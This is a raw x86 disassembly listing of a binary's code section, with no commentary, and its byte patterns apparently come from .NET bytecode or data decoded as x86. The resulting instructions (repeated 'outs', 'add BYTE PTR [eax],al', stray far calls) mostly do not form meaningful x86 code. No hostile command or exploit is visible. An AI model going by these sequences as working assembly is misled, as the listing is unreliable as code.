  402621:	add    BYTE PTR [eax],al
  402623:	or     bh,BYTE PTR [edx+0x2]
  402626:	outs   dx,DWORD PTR ds:[esi]
  402627:	cmp    BYTE PTR [eax],al
  402629:	add    BYTE PTR [esi],al
  40262b:	outs   dx,DWORD PTR ds:[esi]
  40262c:	adc    DWORD PTR [eax],eax
  40262e:	add    BYTE PTR [esi],al
  402630:	outs   dx,DWORD PTR ds:[esi]
  402631:	dec    ebx
  402632:	add    BYTE PTR [eax],al
  402634:	push   es
  402635:	outs   dx,DWORD PTR ds:[esi]
  402636:	pop    ds
  402637:	add    BYTE PTR [eax],al
  402639:	or     ch,BYTE PTR ds:0x5a2810
  40263f:	add    BYTE PTR [esi],al
  402641:	jb     0x402620
  402643:	add    BYTE PTR [eax],al
  402645:	jo     0x4026ba
  402647:	inc    ebp
  402648:	add    BYTE PTR [eax],al
  40264a:	or     bh,BYTE PTR [edx+0x3]
  40264d:	add    ch,BYTE PTR [edi+0x30]
  402650:	add    BYTE PTR [eax],al
  402652:	push   es
  402653:	adc    al,BYTE PTR [ecx]
  402655:	adc    al,BYTE PTR [edx]
  402657:	sub    BYTE PTR ds:0x3060000,al
  40265d:	add    ch,BYTE PTR [edi+0x31]
  402660:	add    BYTE PTR [eax],al
  402662:	push   es
  402663:	adc    al,BYTE PTR [ebx]
  402665:	adc    al,BYTE PTR [eax+ebp*1]
  402668:	add    eax,0x73060000
  40266d:	inc    esi
  40266e:	add    BYTE PTR [eax],al
  402670:	or     dl,BYTE PTR [ebx]
  402672:	add    eax,0x6f070511
  402677:	inc    edi
  402678:	add    BYTE PTR [eax],al
  40267a:	or     dl,BYTE PTR [ecx]
  40267c:	add    eax,0x486f08
  402681:	add    BYTE PTR [edx],cl
  402683:	adc    DWORD PTR ds:0x386f02,eax
  402689:	add    BYTE PTR [esi],al
  40268b:	outs   dx,DWORD PTR ds:[esi]
  40268c:	adc    BYTE PTR [eax],al
  40268e:	add    BYTE PTR [esi],al
  402690:	outs   dx,DWORD PTR ds:[esi]
  402691:	dec    ebx
  402692:	add    BYTE PTR [eax],al
  402694:	push   es
  402695:	outs   dx,DWORD PTR ds:[esi]
  402696:	and    DWORD PTR [eax],eax
  402698:	add    BYTE PTR [edx],cl
  40269a:	outs   dx,DWORD PTR ds:[esi]
  40269b:	dec    ecx
  40269c:	add    BYTE PTR [eax],al
  40269e:	or     dl,BYTE PTR [ecx]
  4026a0:	add    eax,0x4a6f09
  4026a5:	add    BYTE PTR [edx],cl
  4026a7:	adc    DWORD PTR ds:0x4b6f0411,eax
  4026ad:	add    BYTE PTR [eax],al
  4026af:	or     dl,BYTE PTR [ecx]
  4026b1:	add    eax,0x386f02
  4026b6:	add    BYTE PTR [esi],al
  4026b8:	outs   dx,DWORD PTR ds:[esi]
  4026b9:	adc    DWORD PTR [eax],eax
  4026bb:	add    BYTE PTR [esi],al
  4026bd:	outs   dx,DWORD PTR ds:[esi]
  4026be:	dec    ebx
  4026bf:	add    BYTE PTR [eax],al
  4026c1:	push   es
  4026c2:	outs   dx,DWORD PTR ds:[esi]
  4026c3:	and    DWORD PTR [eax],eax
  4026c5:	add    BYTE PTR [edx],cl
  4026c7:	outs   dx,DWORD PTR ds:[esi]
  4026c8:	dec    esp
  4026c9:	add    BYTE PTR [eax],al
  4026cb:	or     al,BYTE PTR [edx]
  4026cd:	outs   dx,DWORD PTR ds:[esi]
  4026ce:	cmp    BYTE PTR [eax],al
  4026d0:	add    BYTE PTR [esi],al
  4026d2:	outs   dx,DWORD PTR ds:[esi]
  4026d3:	adc    al,BYTE PTR [eax]
  4026d5:	add    BYTE PTR [esi],al
  4026d7:	outs   dx,DWORD PTR ds:[esi]
  4026d8:	pop    ds
  4026d9:	add    BYTE PTR [eax],al
  4026db:	or     ch,BYTE PTR [ecx+ebx*1]
  4026de:	adc    DWORD PTR ds:0x386f02,eax
  4026e4:	add    BYTE PTR [esi],al
  4026e6:	outs   dx,DWORD PTR ds:[esi]
  4026e7:	adc    al,BYTE PTR [eax]
  4026e9:	add    BYTE PTR [esi],al
  4026eb:	outs   dx,DWORD PTR ds:[esi]
  4026ec:	and    DWORD PTR [eax],eax
  4026ee:	add    BYTE PTR [edx],cl
  4026f0:	outs   dx,DWORD PTR ds:[esi]
  4026f1:	dec    ebp
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	or     ch,BYTE PTR [ebx]
  4026f6:	or     al,0x11
  4026f8:	add    eax,0xf372
  4026fd:	jo     0x40276e
  4026ff:	dec    ebp
  402700:	add    BYTE PTR [eax],al
  402702:	or     al,BYTE PTR [edx]
  402704:	outs   dx,DWORD PTR ds:[esi]
  402705:	cmp    BYTE PTR [eax],al
  402707:	add    BYTE PTR [esi],al
  402709:	outs   dx,DWORD PTR ds:[esi]
  40270a:	adc    DWORD PTR [eax],eax
  40270c:	add    BYTE PTR [esi],al
  40270e:	outs   dx,DWORD PTR ds:[esi]
  40270f:	dec    esp
  402710:	add    BYTE PTR [eax],al
  402712:	push   es
  402713:	outs   dx,DWORD PTR ds:[esi]
  402714:	pop    ds
  402715:	add    BYTE PTR [eax],al
  402717:	or     ch,BYTE PTR [esp+ebx*1]
  40271a:	adc    DWORD PTR ds:0x386f02,eax
  402720:	add    BYTE PTR [esi],al
  402722:	outs   dx,DWORD PTR ds:[esi]
  402723:	adc    DWORD PTR [eax],eax
  402725:	add    BYTE PTR [esi],al
  402727:	outs   dx,DWORD PTR ds:[esi]
  402728:	dec    esp
  402729:	add    BYTE PTR [eax],al
  40272b:	push   es
  40272c:	outs   dx,DWORD PTR ds:[esi]
  40272d:	and    DWORD PTR [eax],eax
  40272f:	add    BYTE PTR [edx],cl
  402731:	outs   dx,DWORD PTR ds:[esi]
  402732:	dec    esi
  402733:	add    BYTE PTR [eax],al
  402735:	or     dl,BYTE PTR [ecx]
  402737:	add    eax,0x4f6f06
  40273c:	add    BYTE PTR [edx],cl
  40273e:	add    ch,BYTE PTR [edi+0x38]
  402741:	add    BYTE PTR [eax],al
  402743:	push   es
  402744:	outs   dx,DWORD PTR ds:[esi]
  402745:	adc    BYTE PTR [eax],al
  402747:	add    BYTE PTR [esi],al
  402749:	outs   dx,DWORD PTR ds:[esi]
  40274a:	dec    esi
  40274b:	add    BYTE PTR [eax],al
  40274d:	push   es
  40274e:	outs   dx,DWORD PTR ds:[esi]
  40274f:	adc    eax,0x2c060000
  402754:	sbb    DWORD PTR [ebx],eax
  402756:	add    ch,BYTE PTR [edi+0x32]
  402759:	add    BYTE PTR [eax],al
  40275b:	push   es
  40275c:	adc    al,BYTE PTR [esi]
  40275e:	adc    al,BYTE PTR [edi]
  402760:	sub    BYTE PTR ds:0x11060000,al
  402766:	add    eax,0x506f0611
  40276b:	add    BYTE PTR [eax],al
  40276d:	or     al,BYTE PTR [edx]
  40276f:	outs   dx,DWORD PTR ds:[esi]
  402770:	cmp    BYTE PTR [eax],al
  402772:	add    BYTE PTR [esi],al
  402774:	outs   dx,DWORD PTR ds:[esi]
  402775:	adc    DWORD PTR [eax],eax
  402777:	add    BYTE PTR [esi],al
  402779:	outs   dx,DWORD PTR ds:[esi]
  40277a:	dec    esi
  40277b:	add    BYTE PTR [eax],al
  40277d:	push   es
  40277e:	outs   dx,DWORD PTR ds:[esi]
  40277f:	adc    eax,0x2c060000
  402784:	sbb    DWORD PTR [ebx],eax
  402786:	add    ch,BYTE PTR [edi+0x33]
  402789:	add    BYTE PTR [eax],al
  40278b:	push   es
  40278c:	adc    cl,BYTE PTR [eax]
  40278e:	adc    cl,BYTE PTR [ecx]
  402790:	sub    BYTE PTR ds:0x11060000,al
  402796:	add    eax,0x516f0811
  40279b:	add    BYTE PTR [eax],al
  40279d:	or     al,BYTE PTR [ebx]
  40279f:	adc    DWORD PTR ds:0x526f,eax
  4027a5:	or     ch,BYTE PTR [edx]
  4027a7:	add    BYTE PTR [ebx],bl
  4027a9:	xor    BYTE PTR ds:0xd100,al
  4027af:	add    BYTE PTR [eax+eax*1],al
  4027b2:	add    BYTE PTR [ecx],dl
  4027b4:	add    esi,DWORD PTR [ebx+0x53]
  4027b7:	add    BYTE PTR [eax],al
  4027b9:	or     cl,BYTE PTR [edx]
  4027bb:	push   es
  4027bc:	sub    BYTE PTR [edx],cl
  4027be:	add    BYTE PTR [eax],al
  4027c0:	push   es
  4027c1:	outs   dx,DWORD PTR ds:[esi]
  4027c2:	push   esp
  4027c3:	add    BYTE PTR [eax],al
  4027c5:	or     al,BYTE PTR [esi]
  4027c7:	outs   dx,DWORD PTR ds:[esi]
  4027c8:	push   ebp
  4027c9:	add    BYTE PTR [eax],al
  4027cb:	or     cl,BYTE PTR [ebx]
  4027cd:	push   es
  4027ce:	outs   dx,DWORD PTR ds:[esi]
  4027cf:	push   ebp
  4027d0:	add    BYTE PTR [eax],al
  4027d2:	or     ch,BYTE PTR [ebx+ecx*1]
  4027d5:	push   es
  4027d6:	jb     0x4027db
  4027d8:	add    DWORD PTR [eax],eax
  4027da:	jo     0x40284b
  4027dc:	push   esi
  4027dd:	add    BYTE PTR [eax],al
  4027df:	or     al,BYTE PTR [esi]
  4027e1:	outs   dx,DWORD PTR ds:[esi]
  4027e2:	push   edi
  4027e3:	add    BYTE PTR [eax],al
  4027e5:	or     dh,BYTE PTR [ebx+0x58]
  4027e8:	add    BYTE PTR [eax],al
  4027ea:	or     cl,BYTE PTR [eax+ecx*1]
  4027ed:	outs   dx,DWORD PTR ds:[esi]
  4027ee:	pop    ecx
  4027ef:	add    BYTE PTR [eax],al
  4027f1:	or     bl,dh
  4027f3:	sbb    DWORD PTR ds:0x276f09,ecx
  4027f9:	add    BYTE PTR [edx],cl
  4027fb:	jb     0x4027aa
  4027fd:	add    BYTE PTR [eax],al
  4027ff:	jo     0x402807
  402801:	outs   dx,DWORD PTR ds:[esi]
  402802:	pop    edx
  402803:	add    BYTE PTR [eax],al
  402805:	or     ch,BYTE PTR [edi+0x5b]
  402808:	add    BYTE PTR [eax],al
  40280a:	or     bh,dh
  40280c:	sbb    al,BYTE PTR ds:0x1117207
  402812:	add    BYTE PTR [eax+0x28],dh
  402815:	pop    esp
  402816:	add    BYTE PTR [eax],al
  402818:	or     ch,BYTE PTR ds:0x62b0703
  40281e:	or     BYTE PTR [edi+0x5d],ch
  402821:	add    BYTE PTR [eax],al
  402823:	or     dl,BYTE PTR [ecx+0x8]
  402826:	jae    0x402886
  402828:	add    BYTE PTR [eax],al
  40282a:	or     dh,BYTE PTR [ebx+0x5f]
  40282d:	add    BYTE PTR [eax],al
  40282f:	or     dl,BYTE PTR [ebx]
  402831:	add    al,0x4
  402833:	adc    DWORD PTR [edi+ebp*2],eax
  402836:	pusha  
  402837:	add    BYTE PTR [eax],al
  402839:	or     dl,BYTE PTR [ecx+0x11]
  40283c:	add    al,0x6f
  40283e:	popa   
  40283f:	add    BYTE PTR [eax],al
  402841:	or     al,BYTE PTR ds:0x626f50
  402847:	add    BYTE PTR [edx],cl
  402849:	sub    eax,0x63282b
  40284e:	add    BYTE PTR [edx],cl
  402850:	sub    BYTE PTR [eax+eax*1+0x0],dl
  402854:	push   es
  402855:	sbb    BYTE PTR [ebp+0x1000001],cl
  40285b:	adc    eax,DWORD PTR ds:0x5160511
  402861:	push   eax
  402862:	mov    ds:0x4170511,al
  402867:	push   eax
  402868:	mov    ds:0x64280511,al
  40286d:	add    BYTE PTR [eax],al
  40286f:	or     dh,BYTE PTR [ebx+0x65]
  402872:	add    BYTE PTR [eax],al
  402874:	or     bh,BYTE PTR [edx+0x2]
  402877:	outs   dx,DWORD PTR ds:[esi]
  402878:	inc    edx
  402879:	add    BYTE PTR [eax],al
  40287b:	or     al,BYTE PTR [edx]
  40287d:	adc    DWORD PTR [edi+ebp*2],eax
  402880:	data16 add BYTE PTR [eax],al
  402883:	or     ch,BYTE PTR [edx]
  402885:	add    BYTE PTR [eax],al
  402887:	add    BYTE PTR [ecx],al
  402889:	adc    BYTE PTR [eax],al
  40288b:	add    BYTE PTR [eax],al
  40288d:	add    BYTE PTR [eax],bh
  40288f:	add    BYTE PTR [eax],cl
  402891:	inc    eax
  402892:	add    BYTE PTR [ecx],bl
  402894:	add    BYTE PTR cs:[eax],al
  402897:	add    DWORD PTR [ebx],edx
  402899:	xor    BYTE PTR [edx],al
  40289b:	add    BYTE PTR [ebx+0x0],dl
  40289e:	add    BYTE PTR [eax],al
  4028a0:	add    eax,0x2110000
  4028a5:	outs   dx,DWORD PTR ds:[esi]
  4028a6:	add    BYTE PTR [bx+si],al
  4028a9:	or     cl,BYTE PTR [edx]
  4028ab:	push   es
  4028ac:	inc    ebp
  4028ad:	add    eax,DWORD PTR [eax]
  4028af:	add    BYTE PTR [eax],al
  4028b1:	push   ds
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	add    BYTE PTR [eax],dl
  4028b6:	add    BYTE PTR [eax],al
  4028b8:	add    BYTE PTR [edx],al
  4028ba:	add    BYTE PTR [eax],al
  4028bc:	add    BYTE PTR [ebx],ch
  4028be:	sub    BYTE PTR [esi+0x23],bh
  4028c1:	add    BYTE PTR [eax],al
  4028c3:	add    al,0x17
  4028c5:	pop    eax
  4028c6:	and    BYTE PTR [ebx],0x0
  4028c9:	add    BYTE PTR [ebx+ebp*1],al
  4028cc:	sbb    bh,BYTE PTR [esi+0x24]
  4028cf:	add    BYTE PTR [eax],al
  4028d1:	add    al,0x17
  4028d3:	pop    eax
  4028d4:	and    BYTE PTR [eax+eax*1],0x0
  4028d8:	add    al,0x2b
  4028da:	or     al,0x7e
  4028dc:	and    eax,0x17040000
  4028e1:	pop    eax
  4028e2:	and    BYTE PTR ds:0x3040000,0x2c
  4028e9:	or     al,0x7e
  4028eb:	add    BYTE PTR es:[eax],al
  4028ee:	add    al,0x17
  4028f0:	pop    eax
  4028f1:	and    BYTE PTR [esi],0x0
  4028f4:	add    BYTE PTR [edx+ebp*1],al
  4028f7:	sahf   
  4028f8:	sub    BYTE PTR [esi],ch
  4028fa:	add    BYTE PTR [eax],al
  4028fc:	or     ch,BYTE PTR [eax]
  4028fe:	pop    eax
  4028ff:	add    BYTE PTR [eax],al
  402901:	push   es
  402902:	add    ebp,DWORD PTR [edi+0x68]
  402905:	add    BYTE PTR [eax],al
  402907:	or     ch,BYTE PTR [edi+0x32]
  40290a:	add    BYTE PTR [eax],al
  40290c:	or     ch,BYTE PTR [edi+0x1d]
  40290f:	add    BYTE PTR [eax],al
  402911:	or     bh,BYTE PTR [esi+0x23]
  402914:	add    BYTE PTR [eax],al
  402916:	add    al,0x17
  402918:	pop    eax
  402919:	and    BYTE PTR [ebx],0x0
  40291c:	add    BYTE PTR [edx+ebp*1],al
  40291f:	add    BYTE PTR [ebx],dl
  402921:	xor    BYTE PTR [esi],al
  402923:	add    BYTE PTR [edx+0x6000000],dh
  402929:	add    BYTE PTR [eax],al
  40292b:	adc    DWORD PTR [ebx],eax
  40292d:	outs   dx,DWORD PTR ds:[esi]
  40292e:	add    BYTE PTR [bx+si],al
  402931:	or     bh,BYTE PTR [esi+0x22]
  402934:	add    BYTE PTR [eax],al
  402936:	add    al,0x2f
  402938:	add    DWORD PTR [edx],ebp
  40293a:	jle    0x40295d
  40293c:	add    BYTE PTR [eax],al
  40293e:	add    al,0x6f
  402940:	aaa    
  402941:	add    BYTE PTR [eax],al
  402943:	push   es
  402944:	add    ebp,DWORD PTR [edi+0x69]
  402947:	add    BYTE PTR [eax],al
  402949:	or     ch,BYTE PTR [edi+0x25]
  40294c:	add    BYTE PTR [eax],al
  40294e:	push   es
  40294f:	or     al,BYTE PTR [ebx]
  402951:	push   es
  402952:	sub    BYTE PTR [esi],al
  402954:	add    BYTE PTR [eax],al
  402956:	push   es
  402957:	add    ebp,DWORD PTR [edi+0x6a]
  40295a:	add    BYTE PTR [eax],al
  40295c:	or     bl,BYTE PTR [eax]
  40295e:	xor    edx,DWORD PTR [edi]
  402960:	jle    0x402983
  402962:	add    BYTE PTR [eax],al
  402964:	add    al,0x6f
  402966:	cmp    DWORD PTR [eax],eax
  402968:	add    BYTE PTR [esi],al
  40296a:	outs   dx,DWORD PTR ds:[esi]
  40296b:	inc    esi
  40296c:	add    BYTE PTR [eax],al
  40296e:	push   es
  40296f:	outs   dx,DWORD PTR ds:[esi]
  402970:	adc    DWORD PTR [eax],eax
  402972:	add    BYTE PTR [edx],cl
  402974:	sub    eax,0x2d062a01
  402979:	arpl   WORD PTR [eax],bp
  40297b:	adc    al,BYTE PTR [eax]
  40297d:	add    BYTE PTR [edx],cl
  40297f:	jb     0x402994
  402981:	add    DWORD PTR [eax],eax
  402983:	jo     0x4029a0
  402985:	lea    eax,[ecx]
  402987:	add    BYTE PTR [eax],al
  402989:	add    DWORD PTR [ebx],ecx
  40298b:	pop    es
  40298c:	push   ss
  40298d:	add    ebp,DWORD PTR [edi+0x69]
  402990:	add    BYTE PTR [eax],al
  402992:	or     cl,BYTE PTR [edx+ebp*1-0x5dff0000]
  402999:	pop    es
  40299a:	pop    ss
  40299b:	add    ebp,DWORD PTR [edi+0x6b]
  40299e:	add    BYTE PTR [eax],al
  4029a0:	or     ah,BYTE PTR [edx+0x6f031807]
  4029a6:	ins    BYTE PTR es:[edi],dx
  4029a7:	add    BYTE PTR [eax],al
  4029a9:	or     ah,BYTE PTR [edx+0x6f031907]
  4029af:	ins    DWORD PTR es:[edi],dx
  4029b0:	add    BYTE PTR [eax],al
  4029b2:	or     ah,BYTE PTR [edx+0x6f031a07]
  4029b8:	push   0x0
  4029ba:	add    BYTE PTR [edx],cl
  4029bc:	sub    al,0x11
  4029be:	add    ebp,DWORD PTR [edi+0x6a]
  4029c1:	add    BYTE PTR [eax],al
  4029c3:	or     bl,BYTE PTR [eax]
  4029c5:	cs add al,0x1f
  4029c8:	push   eax
  4029c9:	sub    eax,DWORD PTR [esi]
  4029cb:	pop    ds
  4029cc:	inc    ebp
  4029cd:	sub    eax,DWORD PTR [edx]
  4029cf:	pop    ds
  4029d0:	inc    esp
  4029d1:	mov    WORD PTR [ebp+0x0],cs
  4029d4:	add    BYTE PTR [ecx],al
  4029d6:	mov    ds:0x6e6f07,al
  4029db:	add    BYTE PTR [edx],cl
  4029dd:	sub    al,BYTE PTR [eax]
  4029df:	add    BYTE PTR [ebx],dl
  4029e1:	xor    BYTE PTR [eax+eax*1],al
  4029e4:	aaa    
  4029e5:	add    DWORD PTR [eax],eax
  4029e7:	add    BYTE PTR [edi],al
  4029e9:	add    BYTE PTR [eax],al
  4029eb:	adc    DWORD PTR [ebx],eax
  4029ed:	outs   dx,DWORD PTR ds:[esi]
  4029ee:	add    BYTE PTR [bx+si],al
  4029f1:	or     bh,BYTE PTR [esi+0x22]
  4029f4:	add    BYTE PTR [eax],al
  4029f6:	add    al,0x2f
  4029f8:	add    DWORD PTR [edx],ebp
  4029fa:	jle    0x402a1d
  4029fc:	add    BYTE PTR [eax],al
  4029fe:	add    al,0x6f
  402a00:	aaa    
  402a01:	add    BYTE PTR [eax],al
  402a03:	push   es
  402a04:	add    ebp,DWORD PTR [edi+0x69]
  402a07:	add    BYTE PTR [eax],al
  402a09:	or     ch,BYTE PTR [edi+0x25]
  402a0c:	add    BYTE PTR [eax],al
  402a0e:	push   es
  402a0f:	or     al,BYTE PTR [ebx]
  402a11:	push   es
  402a12:	sub    BYTE PTR [esi],al
  402a14:	add    BYTE PTR [eax],al
  402a16:	push   es
  402a17:	push   es
  402a18:	sub    al,0x1
  402a1a:	sub    al,BYTE PTR [ebx]
  402a1c:	outs   dx,DWORD PTR ds:[esi]
  402a1d:	push   0x0
  402a1f:	add    BYTE PTR [edx],cl
  402a21:	sbb    BYTE PTR [ebx],dh
  402a23:	pop    ss
  402a24:	jle    0x402a47
  402a26:	add    BYTE PTR [eax],al
  402a28:	add    al,0x6f
  402a2a:	cmp    DWORD PTR [eax],eax
  402a2c:	add    BYTE PTR [esi],al
  402a2e:	outs   dx,DWORD PTR ds:[esi]
  402a2f:	inc    esi
  402a30:	add    BYTE PTR [eax],al
  402a32:	push   es
  402a33:	outs   dx,DWORD PTR ds:[esi]
  402a34:	adc    DWORD PTR [eax],eax
  402a36:	add    BYTE PTR [edx],cl
  402a38:	sub    eax,0x207e2a01
  402a3d:	add    BYTE PTR [eax],al
  402a3f:	add    al,0x72
  402a41:	dec    edi
  402a42:	add    DWORD PTR [eax],eax
  402a44:	jo     0x402ab5
  402a46:	pop    ss
  402a47:	add    BYTE PTR [eax],al
  402a49:	or     bh,BYTE PTR [esi+0x20]
  402a4c:	add    BYTE PTR [eax],al
  402a4e:	add    al,0x72
  402a50:	pop    ebx
  402a51:	add    DWORD PTR [eax],eax
  402a53:	jo     0x402a58
  402a55:	outs   dx,DWORD PTR ds:[esi]
  402a56:	imul   eax,DWORD PTR [eax],0x6f280a00
  402a5c:	add    BYTE PTR [eax],al
  402a5e:	or     ch,BYTE PTR [eax]
  402a60:	jo     0x402a62
  402a62:	add    BYTE PTR [edx],cl
  402a64:	outs   dx,DWORD PTR ds:[esi]
  402a65:	sbb    BYTE PTR [eax],al
  402a67:	add    BYTE PTR [edx],cl
  402a69:	jle    0x402a8b
  402a6b:	add    BYTE PTR [eax],al
  402a6d:	add    al,0x72
  402a6f:	add    DWORD PTR gs:[eax],eax
  402a72:	jo     0x402a77
  402a74:	outs   dx,DWORD PTR ds:[esi]
  402a75:	add    BYTE PTR [bx+si],al
  402a78:	or     cl,BYTE PTR [ebp+eax*1+0x28010000]
  402a7f:	outs   dx,DWORD PTR ds:[esi]
  402a80:	add    BYTE PTR [eax],al
  402a82:	or     ch,BYTE PTR [eax]
  402a84:	jno    0x402a86
  402a86:	add    BYTE PTR [edx],cl
  402a88:	outs   dx,DWORD PTR ds:[esi]
  402a89:	sbb    BYTE PTR [eax],al
  402a8b:	add    BYTE PTR [edx],cl
  402a8d:	jle    0x402aaf
  402a8f:	add    BYTE PTR [eax],al
  402a91:	add    al,0x72
  402a93:	jno    0x402a96
  402a95:	add    BYTE PTR [eax+0x3],dh
  402a98:	outs   dx,DWORD PTR ds:[esi]
  402a99:	push   0x0
  402a9b:	add    BYTE PTR [edx],cl
  402a9d:	mov    WORD PTR [eax+eax*1+0x0],cs
  402aa1:	add    DWORD PTR [eax],ebp
  402aa3:	outs   dx,DWORD PTR ds:[esi]
  402aa4:	add    BYTE PTR [eax],al
  402aa6:	or     ch,BYTE PTR [eax]
  402aa8:	jno    0x402aaa
  402aaa:	add    BYTE PTR [edx],cl
  402aac:	outs   dx,DWORD PTR ds:[esi]
  402aad:	sbb    BYTE PTR [eax],al
  402aaf:	add    BYTE PTR [edx],cl
  402ab1:	add    ebp,DWORD PTR [edi+0x6b]
  402ab4:	add    BYTE PTR [eax],al
  402ab6:	or     ch,BYTE PTR [edx*1+0x207e]
  402abd:	add    al,0x72
  402abf:	jnp    0x402ac2
  402ac1:	add    BYTE PTR [eax+0x3],dh
  402ac4:	outs   dx,DWORD PTR ds:[esi]
  402ac5:	imul   eax,DWORD PTR [eax],0x0
  402ac8:	or     ch,BYTE PTR [edi+0x18]
  402acb:	add    BYTE PTR [eax],al
  402acd:	or     al,BYTE PTR [ebx]
  402acf:	outs   dx,DWORD PTR ds:[esi]
  402ad0:	ins    BYTE PTR es:[edi],dx
  402ad1:	add    BYTE PTR [eax],al
  402ad3:	or     ch,BYTE PTR [edx*1+0x207e]
  402ada:	add    al,0x72
  402adc:	mov    DWORD PTR [ecx],eax
  402ade:	add    BYTE PTR [eax+0x3],dh
  402ae1:	outs   dx,DWORD PTR ds:[esi]
  402ae2:	ins    BYTE PTR es:[edi],dx
  402ae3:	add    BYTE PTR [eax],al
  402ae5:	or     ch,BYTE PTR [edi+0x18]
  402ae8:	add    BYTE PTR [eax],al
  402aea:	or     al,BYTE PTR [ebx]
  402aec:	outs   dx,DWORD PTR ds:[esi]
  402aed:	jb     0x402aef
  402aef:	add    BYTE PTR [edx],cl
  402af1:	sub    al,0x15
  402af3:	jle    0x402b15
  402af5:	add    BYTE PTR [eax],al
  402af7:	add    al,0x72
  402af9:	fwait
  402afa:	add    DWORD PTR [eax],eax
  402afc:	jo     0x402b01
  402afe:	outs   dx,DWORD PTR ds:[esi]
  402aff:	jb     0x402b01
  402b01:	add    BYTE PTR [edx],cl
  402b03:	outs   dx,DWORD PTR ds:[esi]
  402b04:	sbb    BYTE PTR [eax],al
  402b06:	add    BYTE PTR [edx],cl
  402b08:	jle    0x402b2a
  402b0a:	add    BYTE PTR [eax],al
  402b0c:	add    al,0x3
  402b0e:	outs   dx,DWORD PTR ds:[esi]
  402b0f:	ins    DWORD PTR es:[edi],dx
  402b10:	add    BYTE PTR [eax],al
  402b12:	or     ch,BYTE PTR [edi+0x73]
  402b15:	add    BYTE PTR [eax],al
  402b17:	or     bh,BYTE PTR [esi+0x20]
  402b1a:	add    BYTE PTR [eax],al
  402b1c:	add    al,0x6f
  402b1e:	sbb    DWORD PTR [eax],eax
  402b20:	add    BYTE PTR [edx],cl
  402b22:	sub    al,BYTE PTR [eax]
  402b24:	adc    esi,DWORD PTR [eax]
  402b26:	add    eax,DWORD PTR [eax]
  402b28:	dec    esi
  402b29:	add    BYTE PTR [eax],al
  402b2b:	add    BYTE PTR [eax],cl
  402b2d:	add    BYTE PTR [eax],al
  402b2f:	adc    DWORD PTR [eax],ebp
  402b31:	je     0x402b33
  402b33:	add    BYTE PTR [edx],cl
  402b35:	rcr    BYTE PTR [ecx],1
  402b37:	add    BYTE PTR [eax],al
  402b39:	add    DWORD PTR [eax],ebp
  402b3b:	and    BYTE PTR [eax],al
  402b3d:	add    BYTE PTR [edx],cl
  402b3f:	push   ss
  402b40:	outs   dx,DWORD PTR ds:[esi]
  402b41:	jne    0x402b43
  402b43:	add    BYTE PTR [edx],cl
  402b45:	or     al,BYTE PTR [esi]
  402b47:	mov    gs,WORD PTR [ecx+0x16]
  402b4a:	xor    DWORD PTR [edx],esp
  402b4c:	push   es
  402b4d:	push   ss
  402b4e:	call   0xb01:0x1974
  402b55:	pop    es
  402b56:	outs   dx,DWORD PTR ds:[esi]
  402b57:	jbe    0x402b59
  402b59:	add    BYTE PTR [edx],cl
  402b5b:	jb     0x402b6e
  402b5d:	add    DWORD PTR [eax],eax
  402b5f:	jo     0x402b89
  402b61:	ja     0x402b63
  402b63:	add    BYTE PTR [edx],cl
  402b65:	sub    al,0x7
  402b67:	pop    es
  402b68:	outs   dx,DWORD PTR ds:[esi]
  402b69:	jbe    0x402b6b
  402b6b:	add    BYTE PTR [edx],cl
  402b6d:	sub    ch,BYTE PTR [eax]
  402b6f:	je     0x402b71
  402b71:	add    BYTE PTR [edx],cl
  402b73:	outs   dx,DWORD PTR ds:[esi]
  402b74:	js     0x402b76
  402b76:	add    BYTE PTR [edx],cl
  402b78:	sub    BYTE PTR [ecx+0x0],bh
  402b7b:	add    BYTE PTR [edx],cl
  402b7d:	sub    al,BYTE PTR [eax]
  402b7f:	add    BYTE PTR [ebx],dl
  402b81:	xor    BYTE PTR [ebx],al
  402b83:	add    BYTE PTR [eax+eax*1+0x0],al
  402b87:	add    BYTE PTR [ecx],cl
  402b89:	add    BYTE PTR [eax],al
  402b8b:	adc    DWORD PTR [eax],ebp
  402b8d:	je     0x402b8f
  402b8f:	add    BYTE PTR [edx],cl
  402b91:	rcl    BYTE PTR [esi],1
  402b93:	add    BYTE PTR [eax],al
  402b95:	add    DWORD PTR [eax],ebp
  402b97:	and    BYTE PTR [eax],al
  402b99:	add    BYTE PTR [edx],cl
  402b9b:	push   ss
  402b9c:	outs   dx,DWORD PTR ds:[esi]
  402b9d:	jne    0x402b9f
  402b9f:	add    BYTE PTR [edx],cl
  402ba1:	or     al,BYTE PTR [esi]
  402ba3:	mov    gs,WORD PTR [ecx+0x16]
  402ba6:	xor    DWORD PTR [edx],esp
  402ba8:	push   es
  402ba9:	push   ss
  402baa:	call   0xb01:0x1674
  402bb1:	pop    es
  402bb2:	outs   dx,DWORD PTR ds:[esi]
  402bb3:	jp     0x402bb5
  402bb5:	add    BYTE PTR [edx],cl
  402bb7:	jb     0x402bca
  402bb9:	add    DWORD PTR [eax],eax
  402bbb:	jo     0x402be5
  402bbd:	ja     0x402bbf
  402bbf:	add    BYTE PTR [edx],cl
  402bc1:	sub    al,0x7
  402bc3:	pop    es
  402bc4:	outs   dx,DWORD PTR ds:[esi]
  402bc5:	jp     0x402bc7
  402bc7:	add    BYTE PTR [edx],cl
  402bc9:	sub    dh,BYTE PTR [edx+0x11]
  402bcc:	add    DWORD PTR [eax],eax
  402bce:	jo     0x402bfa
  402bd0:	adc    esi,DWORD PTR [eax]
  402bd2:	add    eax,DWORD PTR [eax]
  402bd4:	inc    esp
  402bd5:	add    BYTE PTR [eax],al
  402bd7:	add    BYTE PTR [edx],cl
  402bd9:	add    BYTE PTR [eax],al
  402bdb:	adc    DWORD PTR [eax],ebp
  402bdd:	je     0x402bdf
  402bdf:	add    BYTE PTR [edx],cl
  402be1:	rcl    BYTE PTR [edx],1
  402be3:	add    BYTE PTR [eax],al
  402be5:	add    DWORD PTR [eax],ebp
  402be7:	and    BYTE PTR [eax],al
  402be9:	add    BYTE PTR [edx],cl
  402beb:	push   ss
  402bec:	outs   dx,DWORD PTR ds:[esi]
  402bed:	jne    0x402bef
  402bef:	add    BYTE PTR [edx],cl
  402bf1:	or     al,BYTE PTR [esi]
  402bf3:	mov    gs,WORD PTR [ecx+0x16]
  402bf6:	xor    DWORD PTR [edx],esp
  402bf8:	push   es
  402bf9:	push   ss
  402bfa:	call   0xb01:0x1274
  402c01:	pop    es
  402c02:	outs   dx,DWORD PTR ds:[esi]
  402c03:	jnp    0x402c05
  402c05:	add    BYTE PTR [edx],cl
  402c07:	jb     0x402c1a
  402c09:	add    DWORD PTR [eax],eax
